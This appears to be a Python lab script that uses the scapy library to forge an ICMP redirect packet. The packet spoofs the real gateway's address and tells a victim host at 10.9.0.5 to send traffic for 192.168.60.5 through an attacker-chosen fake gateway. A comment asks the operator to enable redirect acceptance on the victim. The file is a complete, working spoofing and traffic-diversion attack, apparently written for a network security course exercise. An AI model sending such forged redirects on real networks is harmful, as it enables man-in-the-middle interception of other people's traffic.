#!/usr/bin/env python3

from scapy.all import *  

# Remember to run the following command on victim
# sudo sysctl net.ipv4.conf.all.accept_redirects=1

#victim = sys.argv[1]
#real_gateway = sys.argv[2]
#fake_gateway = sys.argv[3]
victim = '10.9.0.5'
real_gateway = '10.9.0.11'
fake_gateway = '10.9.0.111'
  
ip = IP(src = real_gateway,  dst = victim)  
icmp = ICMP(type=5, code=1)  
icmp.gw = fake_gateway

ip2 = IP(src = victim, dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP());

